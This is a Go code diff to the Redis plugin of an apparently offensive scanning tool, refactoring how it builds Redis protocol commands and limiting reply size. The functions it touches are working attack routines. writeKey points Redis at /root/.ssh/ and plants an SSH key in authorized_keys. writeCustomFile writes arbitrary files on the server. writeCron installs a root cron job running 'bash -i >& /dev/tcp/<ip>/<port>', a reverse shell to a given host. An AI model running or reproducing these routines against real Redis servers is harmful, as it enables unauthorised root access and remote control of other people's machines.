@@ -23,6 +23,8 @@ type RedisPlugin struct {
 	plugins.BasePlugin
 }
 
+const maxRedisReplyBytes = 1 << 20
+
 // NewRedisPlugin 创建Redis插件
 func NewRedisPlugin() *RedisPlugin {
 	return &RedisPlugin{
@@ -98,10 +100,8 @@ func (p *RedisPlugin) doRedisAuth(ctx context.Context, info *common.HostInfo, cr
 
 	// 如果有密码，进行认证
 	if cred.Password != "" {
-		authCmd := fmt.Sprintf("AUTH %s\r\n", cred.Password)
-
 		_ = conn.SetWriteDeadline(time.Now().Add(timeout))
-		if _, writeErr := conn.Write([]byte(authCmd)); writeErr != nil {
+		if _, writeErr := conn.Write(buildRedisAuthCommand(cred.Password)); writeErr != nil {
 			_ = conn.Close()
 			return &AuthResult{
 				Success:   false,
@@ -232,9 +232,8 @@ func (p *RedisPlugin) exploitWithPassword(ctx context.Context, info *common.Host
 
 	// 如果有密码，先认证
 	if password != "" {
-		authCmd := fmt.Sprintf("AUTH %s\r\n", password)
 		_ = conn.SetWriteDeadline(time.Now().Add(session.Config.Timeout))
-		if _, writeErr := conn.Write([]byte(authCmd)); writeErr != nil {
+		if _, writeErr := conn.Write(buildRedisAuthCommand(password)); writeErr != nil {
 			return
 		}
 		_ = conn.SetReadDeadline(time.Now().Add(session.Config.Timeout))
@@ -399,7 +398,7 @@ func (p *RedisPlugin) exploit(ctx context.Context, info *common.HostInfo, conn n
 
 func (p *RedisPlugin) readReply(conn net.Conn) (string, error) {
 	_ = conn.SetReadDeadline(time.Now().Add(time.Second))
-	bytes, err := io.ReadAll(conn)
+	bytes, err := io.ReadAll(io.LimitReader(conn, maxRedisReplyBytes))
 	if len(bytes) > 0 {
 		err = nil
 	}
@@ -408,8 +407,8 @@ func (p *RedisPlugin) readReply(conn net.Conn) (string, error) {
 
 // sendCmd 发送Redis命令并检查OK响应
 // 返回响应文本、是否成功、错误
-func (p *RedisPlugin) sendCmd(conn net.Conn, cmd string) (text string, ok bool, err error) {
-	if _, err = conn.Write([]byte(cmd)); err != nil {
+func (p *RedisPlugin) sendCmd(conn net.Conn, cmd []byte) (text string, ok bool, err error) {
+	if _, err = conn.Write(cmd); err != nil {
 		return "", false, err
 	}
 	text, err = p.readReply(conn)
@@ -420,7 +419,7 @@ func (p *RedisPlugin) sendCmd(conn net.Conn, cmd string) (text string, ok bool, 
 }
 
 func (p *RedisPlugin) getConfig(conn net.Conn) (dbfilename string, dir string, err error) {
-	if _, err = conn.Write([]byte("CONFIG GET dbfilename\r\n")); err != nil {
+	if _, err = conn.Write(buildRedisCommand("CONFIG", "GET", "dbfilename")); err != nil {
 		return
 	}
 	text, err := p.readReply(conn)
@@ -435,7 +434,7 @@ func (p *RedisPlugin) getConfig(conn net.Conn) (dbfilename string, dir string, e
 		dbfilename = text1[0]
 	}
 
-	if _, err = conn.Write([]byte("CONFIG GET dir\r\n")); err != nil {
+	if _, err = conn.Write(buildRedisCommand("CONFIG", "GET", "dir")); err != nil {
 		return
 	}
 	text, err = p.readReply(conn)
@@ -463,14 +462,14 @@ func (p *RedisPlugin) getConfig(conn net.Conn) (dbfilename string, dir string, e
 }
 
 func (p *RedisPlugin) recoverDB(dbfilename string, dir string, conn net.Conn) (err error) {
-	if _, err = fmt.Fprintf(conn, "CONFIG SET dbfilename %s\r\n", dbfilename); err != nil {
+	if _, err = conn.Write(buildRedisCommand("CONFIG", "SET", "dbfilename", dbfilename)); err != nil {
 		return
 	}
 	if _, err = p.readReply(conn); err != nil {
 		return
 	}
 
-	if _, err = fmt.Fprintf(conn, "CONFIG SET dir %s\r\n", dir); err != nil {
+	if _, err = conn.Write(buildRedisCommand("CONFIG", "SET", "dir", dir)); err != nil {
 		return
 	}
 	if _, err = p.readReply(conn); err != nil {
@@ -499,27 +498,25 @@ func (p *RedisPlugin) readFile(filename string) (string, error) {
 
 func (p *RedisPlugin) writeCustomFile(conn net.Conn, dirPath, fileName, content string) (flag bool, text string, err error) {
 	// 设置目录
-	text, ok, err := p.sendCmd(conn, fmt.Sprintf("CONFIG SET dir %s\r\n", dirPath))
+	text, ok, err := p.sendCmd(conn, buildRedisCommand("CONFIG", "SET", "dir", dirPath))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
 
 	// 设置文件名
-	text, ok, err = p.sendCmd(conn, fmt.Sprintf("CONFIG SET dbfilename %s\r\n", fileName))
+	text, ok, err = p.sendCmd(conn, buildRedisCommand("CONFIG", "SET", "dbfilename", fileName))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
 
 	// 写入内容
-	safeContent := strings.ReplaceAll(content, "\"", "\\\"")
-	safeContent = strings.ReplaceAll(safeContent, "\n", "\\n")
-	text, ok, err = p.sendCmd(conn, fmt.Sprintf("set x \"%s\"\r\n", safeContent))
+	text, ok, err = p.sendCmd(conn, buildRedisCommand("SET", "x", content))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
 
 	// 保存
-	text, ok, err = p.sendCmd(conn, "save\r\n")
+	text, ok, err = p.sendCmd(conn, buildRedisCommand("SAVE"))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
@@ -530,21 +527,18 @@ func (p *RedisPlugin) writeCustomFile(conn net.Conn, dirPath, fileName, content 
 // truncateText 截断文本到50字符
 func (p *RedisPlugin) truncateText(text string) string {
 	text = strings.TrimSpace(text)
-	if len(text) > 50 {
-		return text[:50]
-	}
-	return text
+	return truncateRunes(text, 50)
 }
 
 func (p *RedisPlugin) writeKey(conn net.Conn, filename string) (flag bool, text string, err error) {
 	// 设置目录
-	text, ok, err := p.sendCmd(conn, "CONFIG SET dir /root/.ssh/\r\n")
+	text, ok, err := p.sendCmd(conn, buildRedisCommand("CONFIG", "SET", "dir", "/root/.ssh/"))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
 
 	// 设置文件名
-	text, ok, err = p.sendCmd(conn, "CONFIG SET dbfilename authorized_keys\r\n")
+	text, ok, err = p.sendCmd(conn, buildRedisCommand("CONFIG", "SET", "dbfilename", "authorized_keys"))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
@@ -559,13 +553,13 @@ func (p *RedisPlugin) writeKey(conn net.Conn, filename string) (flag bool, text 
 	}
 
 	// 写入密钥
-	text, ok, err = p.sendCmd(conn, fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key))
+	text, ok, err = p.sendCmd(conn, buildRedisCommand("SET", "x", "\n\n\n"+key+"\n\n\n"))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
 
 	// 保存
-	text, ok, err = p.sendCmd(conn, "save\r\n")
+	text, ok, err = p.sendCmd(conn, buildRedisCommand("SAVE"))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
@@ -575,20 +569,20 @@ func (p *RedisPlugin) writeKey(conn net.Conn, filename string) (flag bool, text 
 
 func (p *RedisPlugin) writeCron(conn net.Conn, host string) (flag bool, text string, err error) {
 	// 尝试设置cron目录（两个可能的路径）
-	text, ok, err := p.sendCmd(conn, "CONFIG SET dir /var/spool/cron/crontabs/\r\n")
+	text, ok, err := p.sendCmd(conn, buildRedisCommand("CONFIG", "SET", "dir", "/var/spool/cron/crontabs/"))
 	if err != nil {
 		return false, p.truncateText(text), err
 	}
 	if !ok {
 		// 尝试备用路径
-		text, ok, err = p.sendCmd(conn, "CONFIG SET dir /var/spool/cron/\r\n")
+		text, ok, err = p.sendCmd(conn, buildRedisCommand("CONFIG", "SET", "dir", "/var/spool/cron/"))
 		if err != nil || !ok {
 			return false, p.truncateText(text), err
 		}
 	}
 
 	// 设置文件名
-	text, ok, err = p.sendCmd(conn, "CONFIG SET dbfilename root\r\n")
+	text, ok, err = p.sendCmd(conn, buildRedisCommand("CONFIG", "SET", "dbfilename", "root"))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
@@ -605,14 +599,14 @@ func (p *RedisPlugin) writeCron(conn net.Conn, host string) (flag bool, text str
 	}
 
 	// 写入cron任务
-	cronCmd := fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)
-	text, ok, err = p.sendCmd(conn, cronCmd)
+	cronContent := fmt.Sprintf("\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\n", scanIp, scanPort)
+	text, ok, err = p.sendCmd(conn, buildRedisCommand("SET", "xx", cronContent))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
 
 	// 保存
-	text, ok, err = p.sendCmd(conn, "save\r\n")
+	text, ok, err = p.sendCmd(conn, buildRedisCommand("SAVE"))
 	if err != nil || !ok {
 		return false, p.truncateText(text), err
 	}
